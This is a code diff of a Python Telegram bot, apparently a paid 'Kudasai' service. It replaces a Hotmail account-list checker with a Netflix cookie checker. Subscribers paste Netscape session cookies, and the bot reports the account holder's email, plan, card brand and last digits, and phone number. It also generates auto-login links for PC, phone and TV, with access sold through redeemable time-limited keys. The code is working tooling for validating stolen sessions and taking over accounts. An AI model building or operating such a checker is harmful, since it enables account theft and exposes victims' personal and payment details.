-        f"• ✅ Successful: {success}\n"
-        f"• ❌ Failed: {failed}\n"
-        f"• Success Rate: {rate}"
-    )
-    await update.message.reply_text(stats_text, parse_mode="Markdown")
-
-async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in ADMIN_IDS:
-        await update.message.reply_text("❌ Access Denied. Admins only.")
-        return
-    await update.message.reply_text("⚙️ **[KUDASAI] ADMIN CONTROL PANEL**", parse_mode="Markdown", reply_markup=get_admin_panel_keyboard())
+        await update.callback_query.message.edit_text(welcome_text, parse_mode="Markdown", reply_markup=get_main_menu(user.id))
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -342,176 +471,301 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = query.from_user.id
     data = query.data
 
+    db_query("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user_id, query.from_user.username or "Unknown"))
+    db_query("UPDATE users SET waiting_for_key=0 WHERE user_id=?", (user_id,))
+
+    if data == "check_membership":
+        is_ch, is_gp = await check_memberships(context.bot, user_id)
+        if not is_ch or not is_gp:
+            await query.answer("❌ You have not joined both the channel and group yet!", show_alert=True)
+            return
+        await query.answer("✅ Memberships verified successfully!", show_alert=False)
+        await start_command(update, context)
+        return
+
+    is_ch, is_gp = await check_memberships(context.bot, user_id)
+    if not is_ch or not is_gp:
+        join_text = (
+            "🔒 **Channel & Group Subscription Required!**\n\n"
+            f"Please join both our channel ({REQUIRED_CHANNEL}) and group ({REQUIRED_GROUP}) first."
+        )
+        await query.message.edit_text(join_text, parse_mode="Markdown", reply_markup=get_join_menu())
+        return
+
     if data == "main_menu":
         await start_command(update, context)
-    elif data == "start_checker":
-        user_data = db_query("SELECT expiry FROM users WHERE user_id=?", (user_id,), "one")
-        has_access = (user_data and user_data[0] and datetime.fromisoformat(user_data[0]) > datetime.now()) or user_id in ADMIN_IDS
-        if not has_access:
-            await query.message.reply_text("❌ Access Denied! Please redeem a key first using /redeem or the menu.")
+    elif data == "check_prompt":
+        is_prem = check_user_premium(user_id)
+        if not is_prem and user_id not in ADMIN_IDS:
+            await query.message.edit_text(
+                "❌ **Subscription Required!**\n\n"
+                "Your premium access has expired or is inactive. Please redeem a time-based access key to use the checker.",
+                parse_mode="Markdown",
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem_prompt"), InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
             return
-        await query.message.reply_text("📥 **Send your accounts:** Upload your `.txt` file containing your Hotmail accounts now.")
+
+        await query.message.edit_text(
+            "🍪 **Send Netflix Cookies**\n\n"
+            "Please paste your Netscape cookies or cookie text directly in the chat now:",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="main_menu")]]))
     elif data == "redeem_prompt":
-        await query.message.reply_text("🔑 Send your key using command: `/redeem <KEY>`")
-    elif data == "set_proxy":
-        await query.message.reply_text("🌐 Send your proxy in `ip:port` or `ip:port:user:pass` format.")
-    elif data == "stats":
-        total_p = bot_stats["total_processed"]
-        success = bot_stats["successful"]
-        failed = bot_stats["failed"]
-        rate = f"{(success / total_p * 100):.1f}%" if total_p > 0 else "0.0%"
-        stats_text = (
-            f"📈 **Statistics:**\n"
-            f"• Total Processed: {total_p}\n"
-            f"• ✅ Successful: {success}\n"
-            f"• ❌ Failed: {failed}\n"
-            f"• Success Rate: {rate}"
+        db_query("UPDATE users SET waiting_for_key=1 WHERE user_id=?", (user_id,))
+        await query.message.edit_text(
+            "🔑 **Enter your Access Key:**\n\n"
+            "Please type and send your key in the chat now:",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="main_menu")]]))
+    elif data == "check_status":
+        is_prem = check_user_premium(user_id)
+        user_data = db_query("SELECT checks_count, premium_expires FROM users WHERE user_id=?", (user_id,), "one")
+        total = user_data["checks_count"] if user_data else 0
+        expires = user_data["premium_expires"] if user_data else "None"
+        
+        status_text = "🟢 Active Premium" if is_prem else "🔴 Expired / Free"
+        if user_id in ADMIN_IDS:
+            status_text = "👑 Administrator (Lifetime)"
+            expires = "Never"
+
+        await query.message.edit_text(
+            f"📊 **Your Account Status:**\n\n"
+            f"• Telegram ID: `{user_id}`\n"
+            f"• Membership: `{status_text}`\n"
+            f"• Expires: `{expires}`\n"
+            f"• Total Checked: `{total}`",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
+    elif data == "guide":
+        guide_msg = (
+            "📖 **User Guide:**\n\n"
+            "1. Click **Redeem Key** to activate your subscription duration.\n"
+            "2. Click **Check Netflix Cookie** and paste your Netscape cookies.\n"
+            "3. Get instant account metrics and auto-login links for **PC**, **Phone**, and **TV**!\n\n"
+            f"👑 Owner: {OWNER_HANDLE}"
         )
-        await query.message.reply_text(stats_text, parse_mode="Markdown")
+        await query.message.edit_text(guide_msg, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
     elif data == "admin_panel":
-        if user_id not in ADMIN_IDS:
-            await query.message.reply_text("❌ Admins only.")
-            return
-        await query.message.edit_text("⚙️ **[KUDASAI] ADMIN CONTROL PANEL**", parse_mode="Markdown", reply_markup=get_admin_panel_keyboard())
-    elif data.startswith("gen_"):
-        if user_id not in ADMIN_IDS:
-            return
-        hours_map = {"gen_1h": 1, "gen_3h": 3, "gen_7h": 7, "gen_10h": 10}
-        hrs = hours_map.get(data, 1)
-        key_str = "KUDASAI-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
-        db_query("INSERT INTO keys (key, duration_hours) VALUES (?, ?)", (key_str, hrs))
-        await query.message.reply_text(f"🔑 **Generated {hrs}H Key:**\n`{key_str}`", parse_mode="Markdown")
-    elif data == "adm_view_users" or data == "adm_list_users":
-        users = db_query("SELECT user_id, username, expiry FROM users", fetch="all")
-        msg = "📋 **Registered Users:**\n\n"
-        for u in users[:25]:
-            msg += f"• ID: `{u[0]}` | @{u[1]} | Expiry: {u[2]}\n"
-        await query.message.reply_text(msg, parse_mode="Markdown")
-    elif data == "adm_view_stats":
-        total_users = len(db_query("SELECT user_id FROM users", fetch="all"))
-        keys_count = len(db_query("SELECT key FROM keys WHERE is_redeemed=0", fetch="all"))
-        await query.message.reply_text(f"📊 **Database Metrics:**\n• Total Users: {total_users}\n• Unused Keys: {keys_count}")
-    elif data == "adm_custom_days":
-        key_str = "KUDASAI-CUSTOM-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
-        db_query("INSERT INTO keys (key, duration_hours) VALUES (?, ?)", (key_str, 72))
-        await query.message.reply_text(f"⏳ **Generated Custom (72H) Key:**\n`{key_str}`", parse_mode="Markdown")
-    elif data == "adm_bulk_gen":
-        bulk_msg = "📦 **Bulk Keys Generated:**\n"
-        for _ in range(5):
-            k = "KUDASAI-BULK-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
-            db_query("INSERT INTO keys (key, duration_hours) VALUES (?, ?)", (k, 24))
-            bulk_msg += f"`{k}` (24H)\n"
-        await query.message.reply_text(bulk_msg, parse_mode="Markdown")
-    elif data == "adm_add_prem":
-        await query.message.reply_text("➕ Use command format: `/addprem <user_id> <hours>`")
-    elif data == "adm_ban":
-        await query.message.reply_text("🔕 Use command format: `/ban <user_id>`")
-    elif data == "adm_unban":
-        await query.message.reply_text("✅ Use command format: `/unban <user_id>`")
-    elif data == "adm_make_admin":
-        await query.message.reply_text("👑 Use command format: `/makeadmin <user_id>`")
-    elif data == "adm_rem_admin":
-        await query.message.reply_text("👤 Use command format: `/removeadmin <user_id>`")
-    elif data == "adm_unused_keys":
-        keys = db_query("SELECT key, duration_hours FROM keys WHERE is_redeemed=0", fetch="all")
-        msg = "📬 **Unused Keys:**\n\n"
-        for k in keys[:30]:
-            msg += f"• `{k[0]}` ({k[1]} Hours)\n"
-        await query.message.reply_text(msg or "No unused keys.", parse_mode="Markdown")
-    elif data == "adm_del_unused":
-        db_query("DELETE FROM keys WHERE is_redeemed=0")
-        await query.message.reply_text("🗑️ All unused keys deleted successfully.")
-    elif data == "adm_redeemed_keys":
-        keys = db_query("SELECT key, redeemed_by FROM keys WHERE is_redeemed=1", fetch="all")
-        msg = "🔒 **Redeemed Keys:**\n\n"
-        for k in keys[:30]:
-            msg += f"• `{k[0]}` (Used by: `{k[1]}`)\n"
-        await query.message.reply_text(msg or "No redeemed keys.", parse_mode="Markdown")
-    elif data == "adm_del_redeemed":
-        db_query("DELETE FROM keys WHERE is_redeemed=1")
-        await query.message.reply_text("🗑️ All redeemed keys cleared.")
-    elif data == "adm_del_all_keys":
-        db_query("DELETE FROM keys")
-        await query.message.reply_text("🧹 All keys wiped from the database.")
-    elif data == "adm_start_giveaway":
-        bot_stats["giveaway_active"] = True
-        await query.message.reply_text("🎁 **Giveaway started!** Users can now participate.")
-    elif data == "adm_end_giveaway":
-        bot_stats["giveaway_active"] = False
-        await query.message.reply_text("🛑 **Giveaway ended.**")
-    elif data == "adm_broadcast":
-        await query.message.reply_text("📢 Use command format: `/broadcast <message>`")
-    elif data == "adm_queue_status":
-        await query.message.reply_text("📋 **Queue Status:** 0 items in queue. All workers operational.")
-    elif data == "adm_channel_settings":
-        await query.message.reply_text(f"📢 **Channel Settings:** Current linked channel: {bot_stats['channel_linked']}")
+        if user_id not in ADMIN_IDS: return
+        users_count = len(db_query("SELECT user_id FROM users", fetch="all"))
+        active_keys = len(db_query("SELECT code FROM keys WHERE is_redeemed=0", fetch="all"))
+        redeemed_keys = len(db_query("SELECT code FROM keys WHERE is_redeemed=1", fetch="all"))
+        
+        await query.message.edit_text(
+            f"⚙️ **ADMIN CONTROL PANEL**\n\n"
+            f"• Total Registered Users: `{users_count}`\n"
+            f"• Unused Keys: `{active_keys}`\n"
+            f"• Redeemed Keys: `{redeemed_keys}`\n\n"
+            f"Commands:\n"
+            f"• `/addkey <duration> [custom_code]`\n"
+            f"  (e.g., `/addkey 7d` or `/addkey lifetime mykey`)",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu")]]))
 
 async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     args = context.args
+    db_query("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user.id, user.username or "Unknown"))
+
     if not args:
-        await update.message.reply_text("❌ Usage: `/redeem <KEY>`")
+        db_query("UPDATE users SET waiting_for_key=1 WHERE user_id=?", (user.id,))
+        await update.message.reply_text("🔑 **Please send your Access Key in the chat now:**", parse_mode="Markdown")
         return
-    key_input = args[0].strip()
-    key_data = db_query("SELECT duration_hours, is_redeemed FROM keys WHERE key=?", (key_input,), "one")
-    
-    if not key_data or key_data[1] == 1:
-        await update.message.reply_text("❌ Invalid or already redeemed key.")
+
+    code = args[0].strip()
+    key_data = db_query("SELECT duration_text, duration_seconds, is_redeemed FROM keys WHERE code=?", (code,), "one")
+    if not key_data:
+        await update.message.reply_text("❌ **Invalid Access Key!**", parse_mode="Markdown")
         return
-    
-    hours = key_data[0]
-    db_query("UPDATE keys SET is_redeemed=1, redeemed_by=? WHERE key=?", (user.id, key_input))
-    
-    current_expiry = db_query("SELECT expiry FROM users WHERE user_id=?", (user.id,), "one")
-    base_time = datetime.now()
-    if current_expiry and current_expiry[0]:
-        parsed_exp = datetime.fromisoformat(current_expiry[0])
-        if parsed_exp > base_time:
-            base_time = parsed_exp
-            
-    new_expiry = base_time + timedelta(hours=hours)
-    db_query("UPDATE users SET expiry=? WHERE user_id=?", (new_expiry.isoformat(), user.id))
-    
-    await update.message.reply_text(f"✅ **Key Redeemed Successfully!**\nAccess extended until: {new_expiry.strftime('%Y-%m-%d %H:%M:%S')}", parse_mode="Markdown")
+    if key_data["is_redeemed"] == 1:
+        await update.message.reply_text("❌ **This key has already been redeemed!**", parse_mode="Markdown")
+        return
+
+    dur_text, dur_secs = key_data["duration_text"], key_data["duration_seconds"]
+    if dur_secs >= 999999999:
+        new_expires = "Lifetime"
+    else:
+        current_user = db_query("SELECT is_premium, premium_expires FROM users WHERE user_id=?", (user.id,), "one")
+        base_time = datetime.now()
+        if current_user and current_user["is_premium"] and current_user["premium_expires"] != "Lifetime":
+            try:
+                exp_dt = datetime.fromisoformat(current_user["premium_expires"])
+                if exp_dt > base_time:
+                    base_time = exp_dt
+            except Exception:
+                pass
+        new_expires = (base_time + timedelta(seconds=dur_secs)).isoformat()
+
+    db_query("UPDATE keys SET is_redeemed=1, redeemed_by=? WHERE code=?", (user.id, code))
+    db_query("UPDATE users SET is_premium=1, premium_expires=? WHERE user_id=?", (new_expires, user.id))
+
+    await update.message.reply_text(
+        f"🎉 **SUBSCRIPTION ACTIVATED!** 🎉\n\n"
+        f"✨ Plan Duration: **{dur_text}**\n"
+        f"⏳ Valid Until: `{new_expires}`",
+        parse_mode="Markdown",
+        reply_markup=get_main_menu(user.id)
+    )
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    user_data = db_query("SELECT is_banned FROM users WHERE user_id=?", (user.id,), "one")
-    if user_data and len(user_data) > 0 and user_data[0] == 1:
-        return
-
-    if update.message.document:
-        doc = update.message.document
-        file_obj = await context.bot.get_file(doc.file_id)
-        byte_array = await file_obj.download_as_bytearray()
-        
-        try:
-            file_content = byte_array.decode("utf-8", errors="ignore")
-        except Exception:
-            file_content = str(byte_array)
-            
-        lines = file_content.splitlines()
-        await process_accounts_with_progress(lines, update.effective_chat.id, context)
-        return
-
     text = update.message.text
-    if text and not text.startswith("/"):
-        lines = text.strip().splitlines()
-        await process_accounts_with_progress(lines, update.effective_chat.id, context)
+    if not text or text.startswith("/"):
+        return
+
+    db_query("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user.id, user.username or "Unknown"))
+
+    is_ch, is_gp = await check_memberships(context.bot, user.id)
+    if not is_ch or not is_gp:
+        await update.message.reply_text(
+            "🔒 **Channel & Group Subscription Required!**\n\n"
+            f"Please join both our channel ({REQUIRED_CHANNEL}) and group ({REQUIRED_GROUP}) first before using the bot.",
+            parse_mode="Markdown",
+            reply_markup=get_join_menu()
+        )
+        return
+
+    user_state = db_query("SELECT waiting_for_key FROM users WHERE user_id=?", (user.id,), "one")
+    if not user_state:
+        return
+
+    # Key Redemption Logic via chat message
+    if user_state["waiting_for_key"] == 1:
+        db_query("UPDATE users SET waiting_for_key=0 WHERE user_id=?", (user.id,))
+        code = text.strip()
+        
+        key_data = db_query("SELECT duration_text, duration_seconds, is_redeemed FROM keys WHERE code=?", (code,), "one")
+        if not key_data:
+            await update.message.reply_text("❌ **Invalid Access Key!** Please check your key.", parse_mode="Markdown")
+            return
+        if key_data["is_redeemed"] == 1:
+            await update.message.reply_text("❌ **This key has already been redeemed!**", parse_mode="Markdown")
+            return
+
+        dur_text, dur_secs = key_data["duration_text"], key_data["duration_seconds"]
+        if dur_secs >= 999999999:
+            new_expires = "Lifetime"
+        else:
+            current_user = db_query("SELECT is_premium, premium_expires FROM users WHERE user_id=?", (user.id,), "one")
+            base_time = datetime.now()
+            if current_user and current_user["is_premium"] and current_user["premium_expires"] != "Lifetime":
+                try:
+                    exp_dt = datetime.fromisoformat(current_user["premium_expires"])
+                    if exp_dt > base_time:
+                        base_time = exp_dt
+                except Exception:
+                    pass
+            new_expires = (base_time + timedelta(seconds=dur_secs)).isoformat()
+
+        db_query("UPDATE keys SET is_redeemed=1, redeemed_by=? WHERE code=?", (user.id, code))
+        db_query("UPDATE users SET is_premium=1, premium_expires=? WHERE user_id=?", (new_expires, user.id))
+
+        await update.message.reply_text(
+            f"🎉 **SUBSCRIPTION ACTIVATED!** 🎉\n\n"
+            f"✨ Plan Duration: **{dur_text}**\n"
+            f"⏳ Valid Until: `{new_expires}`",
+            parse_mode="Markdown",
+            reply_markup=get_main_menu(user.id)
+        )
+        return
+
+    # Cookie Checker Logic
+    is_prem = check_user_premium(user.id)
+    if not is_prem and user.id not in ADMIN_IDS:
+        await update.message.reply_text("❌ **Access Denied:** Your subscription has expired. Redeem a key to continue checking.", parse_mode="Markdown")
+        return
+
+    status_msg = await update.message.reply_text("⏳ <i>Processing cookies and generating tokens...</i>", parse_mode="HTML")
+
+    try:
+        cookies = load_cookies(text)
+        if not cookies or not any(cookies.get(k) for k in ["NetflixId", "SecureNetflixId"]):
+            await status_msg.edit_text("❌ <b>Error:</b> Could not detect valid Netflix cookies (`NetflixId` / `SecureNetflixId`).", parse_mode="HTML")
+            return
+
+        acc = await asyncio.to_thread(check_account, cookies, 20)
+        if not acc:
+            await status_msg.edit_text("❌ <b>Error:</b> Account is dead, logged out, or cookies are expired/invalid.", parse_mode="HTML")
+            return
+
+        db_query("UPDATE users SET checks_count = checks_count + 1 WHERE user_id=?", (user.id,))
+
+        cc = acc.get("country_code", "XX")
+        flag = _flag(cc)
+        p = acc.get("profiles", [])
+        profs = ", ".join(p[:4]) if p else "N/A"
+        pv = "✅" if acc.get("phone_verified") else "❌"
+        nf_id = acc.get("netflix_id_raw", "")
+
+        caption = (
+            f"🎬 <b>NETFLIX ACCOUNT CHECKED</b>\n\n"
+            f"👤 <b>{acc['name']}</b>\n"
+            f"📧 <code>{acc['email']}</code>\n"
+            f"🌍 {acc['country']} {flag} ({cc})\n\n"
+            f"📋 <b>{acc['plan']}</b>  •  💰 {acc['price']}\n"
+            f"📅 Since: {acc['member_since']}\n"
+            f"🗓 Billing: {acc['next_billing']}\n"
+            f"🎁 Free Trial: {'Yes' if acc['free_trial'] else 'No'}\n\n"
+            f"🎥 {acc['video_quality']}  |  📺 {acc['max_streams']} streams  |  ➕ {acc['extra_slots']} extra\n"
+            f"💳 {acc['card_brand']} *{acc['card_last4']}  •  {acc['payment_method']}\n"
+            f"📞 {acc['phone']}  {pv}\n"
+            f"👥 Profiles ({acc['profile_count']}): {profs}\n\n"
+            f"🍪 <b>Cookie Snippet</b>\n"
+            f"<code>NetflixId={nf_id[:30]}...</code>"
+        )
+
+        buttons = []
+        row1 = []
+        if acc.get("login_pc") and acc["login_pc"] != "N/A":
+            row1.append(InlineKeyboardButton("🖥 Click to PC", url=acc["login_pc"]))
+        if acc.get("login_phone") and acc["login_phone"] != "N/A":
+            row1.append(InlineKeyboardButton("📱 Click to Phone", url=acc["login_phone"]))
+        if row1:
+            buttons.append(row1)
+        buttons.append([InlineKeyboardButton("📺 Click to TV", url=acc["login_tv"])])
+
+        reply_markup = InlineKeyboardMarkup(buttons)
+        await status_msg.edit_text(caption, parse_mode="HTML", reply_markup=reply_markup)
+
+    except Exception as e:
+        print(f"[DEBUG] Checker Exception: {e}")
+        await status_msg.edit_text(f"❌ <b>An error occurred:</b> <code>{str(e)}</code>", parse_mode="HTML")
+
+async def add_key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id not in ADMIN_IDS: return
+    args = context.args
+    if not args:
+        await update.message.reply_text("❌ Usage: `/addkey <duration> [custom_code]`\nExample: `/addkey 7d` or `/addkey lifetime mykey`", parse_mode="Markdown")
+        return
+
+    dur_str = args[0]
+    dur_text, dur_secs = parse_duration(dur_str)
+    if not dur_text:
+        await update.message.reply_text("❌ Invalid duration format! Use formats like `30m`, `2h`, `7d`, `1y`, or `lifetime`.", parse_mode="Markdown")
+        return
+
+    code = args[1] if len(args) > 1 else f"kudasaivip-{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}"
+    created_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    db_query("INSERT OR REPLACE INTO keys (code, duration_text, duration_seconds, is_redeemed, created_at) VALUES (?, ?, ?, 0, ?)", (code, dur_text, dur_secs, created_at))
+    await update.message.reply_text(
+        f"✅ **Access Key Created Successfully!**\n\n"
+        f"• Code: `{code}`\n"
+        f"• Duration: **{dur_text}**",
+        parse_mode="Markdown"
+    )
 
 def main():
     app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).post_init(set_bot_commands).build()
 
     app.add_handler(CommandHandler("start", start_command))
+    app.add_handler(CommandHandler("stats", lambda u, c: c.bot.send_message(u.effective_chat.id, f"Membership Status: {'Active 🟢' if check_user_premium(u.effective_user.id) else 'Expired 🔴'}")))
     app.add_handler(CommandHandler("redeem", redeem_command))
-    app.add_handler(CommandHandler("help", help_command))
-    app.add_handler(CommandHandler("stats", stats_command))
-    app.add_handler(CommandHandler("admin", admin_command))
+    app.add_handler(CommandHandler("admin", lambda u, c: u.message.reply_text("Admin Panel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⚙️ Open Admin Control", callback_data="admin_panel")]]))))
+    app.add_handler(CommandHandler("addkey", add_key_command))
     app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_message))
 
-    print(Fore.GREEN + "[+] Kudasai Native Progress Checker Bot is running...")
+    print("[+] Kudasai Netflix Bot with Channel/Group Lock & Duration Keys is online!")
     app.run_polling()
 
 if __name__ == "__main__":
